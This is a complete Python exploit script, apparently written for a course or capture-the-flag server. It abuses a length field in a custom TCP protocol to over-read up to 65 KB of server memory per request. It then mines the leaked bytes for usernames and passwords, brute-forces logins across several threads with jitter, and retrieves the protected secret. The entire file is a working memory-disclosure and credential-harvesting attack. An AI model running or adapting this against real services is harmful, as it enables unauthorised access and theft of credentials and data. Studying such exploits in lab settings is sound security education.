#!/usr/bin/env python3
import socket, struct, sys, time, random, string, threading
from datetime import datetime

HOST = sys.argv[1]
PORT = int(sys.argv[2])

THREADS = 4                     # safe for the professor server
LEAKS_PER_THREAD = 200
LEAK_SIZE = 65520                # faster leaks, safer on server
BASE_SLEEP = 0.20
JITTER = 0.30

MIN_STR_LEN = 3
MAX_STR_LEN = 20
MAX_PAIR_GAP = 80

COMMON_PASSWORDS = [
    b"password", b"secret", b"1234", b"pass", b"admin", b"test123"
]

FAILED = set()
FAILED_LOCK = threading.Lock()

SUCCESS_FLAG = threading.Event()
RESULT = {"user": None, "pass": None, "secret": None, "dump": None}
RESULT_LOCK = threading.Lock()

def log(msg):
    """Timestamped debug print."""
    print(f"[{datetime.now().strftime('%H:%M:%S')}]", msg)


# ===== Utility functions =====
def recvn(s, n, tid):
    buf = b''
    while len(buf) < n:
        try:
            chunk = s.recv(n - len(buf))
        except Exception as e:
            log(f"[T{tid}] recv error: {e}")
            return buf
        if not chunk:
            log(f"[T{tid}] recv returned no data")
            return buf
        buf += chunk
    return buf


def connect(tid):
    try:
        s = socket.socket()
        s.settimeout(2)
        s.connect((HOST, PORT))
        g = recvn(s, 1, tid)
        if g != b'\x05':
            log(f"[T{tid}] Bad greeting: {g}")
            s.close()
            return None
        log(f"[T{tid}] Connected OK")
        return s
    except Exception as e:
        log(f"[T{tid}] connect() failed: {e}")
        return None


def set_user(s, name, tid):
    try:
        hdr = struct.pack("<BH", 0, len(name))
        s.sendall(hdr + name)
        ack = recvn(s, 1, tid)
        if ack != b'\x06':
            log(f"[T{tid}] SET_USER bad ack: {ack}")
            return False
        echo = recvn(s, len(name), tid)
        if echo != name:
            log(f"[T{tid}] SET_USER echo mismatch: {echo} != {name}")
            return False
        return True
    except Exception as e:
        log(f"[T{tid}] set_user exception: {e}")
        return False


def try_pass(s, pw, tid):
    try:
        hdr = struct.pack("<BH", 2, len(pw))
        s.sendall(hdr + pw)
        ack = recvn(s, 1, tid)
        log(f"[T{tid}] TRY_PASS ack: {ack}")
        return ack == b'\x08'
    except Exception as e:
        log(f"[T{tid}] try_pass exception: {e}")
        return False


def get_secret(user, pw, tid):
    try:
        s = connect(tid)
        if not s:
            return None

        if not set_user(s, user, tid):
            s.close()
            return None

        if not try_pass(s, pw, tid):
            log(f"[T{tid}] Wrong password for {user}")
            s.close()
            return None

        log(f"[T{tid}] Correct password confirmed for {user}")

        # Request secret
        hdr = struct.pack("<BH", 4, 0xffff)
        s.sendall(hdr)
        ack = recvn(s, 1, tid)
        if ack != b'\x0a':
            log(f"[T{tid}] GET_SECRET bad ack: {ack}")
            s.close()
            return None

        sec = recvn(s, 65535, tid)
        log(f"[T{tid}] Secret length = {len(sec)}")
        s.close()
        return sec
    except Exception as e:
        log(f"[T{tid}] get_secret exception: {e}")
        return None


# ===== Leak & parse functions =====
def leak_once(tid):
    s = connect(tid)
    if not s:
        return None

    attacker = b"A"*8 + b"\x00"

    if not set_user(s, attacker, tid):
        s.close()
        return None

    hdr = struct.pack("<BH", 1, LEAK_SIZE)
    s.sendall(hdr)

    ack = recvn(s, 1, tid)
    if ack != b'\x06':
        log(f"[T{tid}] GET_USER bad ack: {ack}")
        s.close()
        return None

    dump = recvn(s, LEAK_SIZE, tid)
    log(f"[T{tid}] Leak size = {len(dump)} bytes")
    s.close()

    return dump


def extract_strings(d):
    allowed = bytes(string.ascii_letters + string.digits, "ascii")
    out = []
    start = None

    for i, b in enumerate(d):
        if b in allowed:
            if start is None:
                start = i
        else:
            if start is not None:
                s = d[start:i]
                if MIN_STR_LEN <= len(s) <= MAX_STR_LEN:
                    out.append((start, s))
                start = None
    return out


def build_candidates(d, tid):
    strings = extract_strings(d)

    if strings:
        sample = [s.decode('ascii', 'ignore') for _, s in strings[:5]]
        log(f"[T{tid}] Parsed usernames: {sample}")

    cands = []

    strings.sort(key=lambda x: x[0])

    # Adjacent string pairs
    for i in range(len(strings) - 1):
        o1, s1 = strings[i]
        o2, s2 = strings[i+1]
        if 0 < o2 - o1 < MAX_PAIR_GAP:
            cands.append((s1 + b'\x00', s2 + b'\x00'))

    # Single strings + common passwords
    for off, s1 in strings:
        for pw in COMMON_PASSWORDS:
            cands.append((s1 + b'\x00', pw + b'\x00'))

    # Dedup
    uniq = []
    seen = set()
    for u, p in cands:
        if (u, p) not in seen:
            seen.add((u, p))
            uniq.append((u, p))

    log(f"[T{tid}] Total candidates = {len(uniq)}")
    return uniq


# ===== Thread worker =====
class Worker(threading.Thread):
    def __init__(self, tid):
        super().__init__()
        self.tid = tid

    def run(self):
        log(f"[T{self.tid}] Thread started")

        for i in range(LEAKS_PER_THREAD):
            if SUCCESS_FLAG.is_set():
                break

            log(f"[T{self.tid}] Leak attempt {i}")

            d = leak_once(self.tid)
            if not d:
                log(f"[T{self.tid}] Leak failed")
                time.sleep(BASE_SLEEP)
                continue

            candidates = build_candidates(d, self.tid)

            # Filter out failures
            fresh = []
            with FAILED_LOCK:
                for c in candidates:
                    if c not in FAILED:
                        fresh.append(c)

            log(f"[T{self.tid}] Fresh candidates = {len(fresh)}")

            for user, pw in fresh:
                if SUCCESS_FLAG.is_set():
                    break

                log(f"[T{self.tid}] Trying {user} / {pw}")
                secret = get_secret(user, pw, self.tid)

                if secret:
                    with RESULT_LOCK:
                        if not SUCCESS_FLAG.is_set():
                            RESULT["user"] = user
                            RESULT["pass"] = pw
                            RESULT["secret"] = secret
                            RESULT["dump"] = d
                            SUCCESS_FLAG.set()
                            log(f"[T{self.tid}] SUCCESS!!")
                    break
                else:
                    with FAILED_LOCK:
                        FAILED.add((user, pw))
                        log(f"[T{self.tid}] Cached failure: {user}/{pw}")

            time.sleep(BASE_SLEEP + random.random()*JITTER)

        log(f"[T{self.tid}] Exiting")


# ===== Main =====
def main():
    log(f"[*] DEBUG exploit running on {HOST}:{PORT}")

    threads = [Worker(i) for i in range(THREADS)]
    for t in threads: t.start()

    SUCCESS_FLAG.wait()

    for t in threads: t.join()

    if RESULT["user"]:
        log("[+] Exploit SUCCESS")
        log(f"User:   {RESULT['user']}")
        log(f"Pass:   {RESULT['pass']}")
        log(f"Secret (first 100): {RESULT['secret'][:100]}")

        with open("success_dump.bin", "wb") as f:
            f.write(RESULT["dump"])
        log("Saved success_dump.bin")
    else:
        log("[!] Exploit ended with no success")


if __name__ == "__main__":
    main()
